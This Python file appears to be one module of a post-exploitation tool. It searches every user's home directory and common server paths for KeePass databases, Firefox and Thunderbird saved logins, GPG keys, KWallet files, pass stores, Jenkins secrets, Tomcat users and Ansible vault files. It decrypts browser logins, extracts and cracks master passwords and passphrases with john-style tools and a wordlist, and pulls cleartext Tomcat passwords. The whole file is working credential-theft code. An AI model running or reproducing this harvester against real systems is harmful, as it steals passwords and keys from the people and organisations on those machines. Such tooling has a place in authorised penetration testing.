"""Application credential stores: KeePass, Firefox/Thunderbird, GPG, KWallet,
and common server apps (Jenkins, Tomcat, Ansible)."""
from __future__ import annotations

import os
import re
from typing import List

from core.secret import Secret, Status
from core.tools import (read_text, home_dirs, user_of_home, find_files,
                        which, run, exists, realpath)
from core import cracker
from .base import BaseCollector

KDBX = re.compile(r"\.kdbx?$", re.I)
FF_PROFILES = re.compile(r"^(logins\.json|key4\.db|key3\.db|signons\.sqlite)$", re.I)
KWALLET = re.compile(r"\.kwl$", re.I)


class AppsCollector(BaseCollector):
    name = "Apps"
    description = "KeePass, Firefox/Thunderbird(+decrypt), GPG(+crack), KWallet(+crack), Jenkins/Tomcat/Ansible"

    def collect(self) -> List[Secret]:
        found: List[Secret] = []
        homes = home_dirs()
        found += self._keepass(homes)
        found += self._firefox(homes)
        found += self._gpg(homes)
        found += self._kwallet(homes)
        found += self._flags(homes)
        found += self._server_apps()
        return found

    # --- KeePass ---------------------------------------------------------
    def _keepass(self, homes) -> List[Secret]:
        out = []
        files = find_files(homes, KDBX, max_depth=8)
        for f in files:
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="kdbx",
                              notes="KeePass DB; crack master: keepass2john -> john"))
        if self.crack_enabled and files and which("keepass2john"):
            self.status("cracking keepass")
            lines = []
            for f in files:
                r = run(["keepass2john", realpath(f)], timeout=30)
                for ln in r.output.splitlines():
                    if ln.strip() and ":" in ln and "$keepass$" in ln:
                        lines.append(ln.strip())
            for ident, pw in cracker.crack(lines, self.wordlist, label="keepass",
                                           progress_cb=self.progress_cb()).items():
                out.append(Secret("Apps", "", pw, Status.CRACKED,
                                  secret_type="kdbx-master", target=ident,
                                  notes="cracked KeePass master pw"))
        return out

    # --- Firefox / Thunderbird ------------------------------------------
    def _firefox(self, homes) -> List[Secret]:
        out = []
        profile_dirs = set()
        for h in homes:
            for base in (".mozilla/firefox", ".thunderbird",
                         ".var/app/org.mozilla.firefox/.mozilla/firefox"):
                for f in find_files([os.path.join(h, base)], FF_PROFILES, max_depth=3):
                    profile_dirs.add(os.path.dirname(f))

        ff = which("firefox_decrypt") or which("firefox_decrypt.py")
        for prof in sorted(profile_dirs):
            if ff and self.crack_enabled:
                r = run([ff, "-n", realpath(prof)], timeout=120)
                out += self._parse_ffdecrypt(r.output, prof)
            else:
                out.append(Secret("Apps", "", prof, Status.INFO, target=prof,
                                  secret_type="firefox-profile",
                                  notes="Firefox/Thunderbird creds; decrypt: firefox_decrypt"))
        return out

    def _parse_ffdecrypt(self, out: str, prof: str) -> List[Secret]:
        res = []
        user = url = None
        for line in out.splitlines():
            line = line.strip()
            lo = line.lower()
            if lo.startswith("website:") or lo.startswith("url:"):
                url = line.split(":", 1)[1].strip()
            elif lo.startswith("username:") or lo.startswith("user:"):
                user = line.split(":", 1)[1].strip()
            elif lo.startswith("password:"):
                pw = line.split(":", 1)[1].strip()
                res.append(Secret("Apps", user or "", pw, Status.DECRYPTED,
                                  target=url or prof, secret_type="firefox-login",
                                  notes="Firefox/Thunderbird saved login"))
                user = url = None
        if not res:
            res.append(Secret("Apps", "", prof, Status.INFO, target=prof,
                              secret_type="firefox-profile",
                              notes="Firefox profile (no plaintext extracted / master pw set)"))
        return res

    # --- GPG -------------------------------------------------------------
    def _gpg(self, homes) -> List[Secret]:
        out = []
        if not which("gpg2john"):
            return out
        for h in homes:
            gnupg = os.path.join(h, ".gnupg")
            if not os.path.isdir(gnupg):
                continue
            key_files = find_files([gnupg],
                                   re.compile(r".*\.(key|asc|gpg)$", re.I),
                                   max_depth=2)
            enc = []
            for f in key_files:
                r = run(["gpg2john", realpath(f)], timeout=30)
                for ln in r.output.splitlines():
                    if ln.strip() and ":" in ln and "$gpg$" in ln:
                        enc.append(ln.strip())
            if enc and self.crack_enabled:
                self.status("cracking GPG")
                cracked = cracker.crack(enc, self.wordlist, label="gpg",
                                        progress_cb=self.progress_cb())
                for ident, pw in cracked.items():
                    out.append(Secret("Apps", "", pw, Status.CRACKED,
                                      secret_type="gpg-passphrase", target=ident,
                                      notes="cracked GPG secret-key passphrase"))
        return out

    # --- KWallet ---------------------------------------------------------
    def _kwallet(self, homes) -> List[Secret]:
        out = []
        kw = find_files(homes, KWALLET, max_depth=6)
        for f in kw:
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="kwallet",
                              notes="KWallet DB; crack: kwallet2john -> john"))
        if self.crack_enabled and kw and which("kwallet2john"):
            self.status("cracking kwallet")
            lines = []
            for f in kw:
                r = run(["kwallet2john", realpath(f)], timeout=30)
                for ln in r.output.splitlines():
                    if ln.strip() and ":" in ln and "$kwallet$" in ln:
                        lines.append(ln.strip())
            for ident, pw in cracker.crack(lines, self.wordlist, label="kwallet",
                                           progress_cb=self.progress_cb()).items():
                out.append(Secret("Apps", "", pw, Status.CRACKED,
                                  secret_type="kwallet-pass", target=ident,
                                  notes="cracked KWallet password (use kwalletcli to list)"))
        return out

    # --- flag-only stores ------------------------------------------------
    def _flags(self, homes) -> List[Secret]:
        out = []
        for h in homes:
            user = user_of_home(h)
            for rel, typ, note in (
                (".gnupg", "gpg", "GPG keyring/secret keys"),
                (".local/share/keyrings", "gnome-keyring",
                 "keyring – decrypted by KeyringCollector"),
                (".kde/share/apps/kwallet", "kwallet",
                 "KWallet – crackable via kwallet2john"),
                (".local/share/kwalletd", "kwallet",
                 "KWallet – crackable via kwallet2john"),
                (".password-store", "pass", "pass(1) store – GPG-encrypted"),
            ):
                p = os.path.join(h, rel)
                if exists(p):
                    out.append(Secret("Apps", user, p, Status.INFO, target=p,
                                      secret_type=typ, notes=note))
        return out

    # --- server apps -----------------------------------------------------
    def _server_apps(self) -> List[Secret]:
        out = []
        for f in find_files(["/var/lib/jenkins", "/var/jenkins_home", "/opt"],
                            re.compile(r"^(credentials\.xml|master\.key|hudson\.util\.Secret)$"),
                            max_depth=4):
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="jenkins",
                              notes="Jenkins secret; decrypt needs master.key+hudson.util.Secret"))
        for f in find_files(["/etc/tomcat*", "/opt", "/usr/share/tomcat*", "/var/lib/tomcat*"],
                            re.compile(r"^tomcat-users\.xml$"), max_depth=5):
            txt = read_text(f)
            if txt:
                for m in re.finditer(
                        r'password="([^"]+)".*?username="([^"]+)"'
                        r'|username="([^"]+)".*?password="([^"]+)"', txt):
                    user = m.group(2) or m.group(3) or ""
                    pw = m.group(1) or m.group(4) or ""
                    out.append(Secret("Apps", user, pw, Status.CLEARTEXT, target=f,
                                      secret_type="password", notes="Tomcat user"))
        for f in find_files(["/etc/ansible", "/opt", "/home", "/root"],
                            re.compile(r"(vault[_-]?pass.*|\.vault_pass|.*\.vault)$", re.I),
                            max_depth=5):
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="ansible",
                              notes="Ansible vault/password file"))
        return out
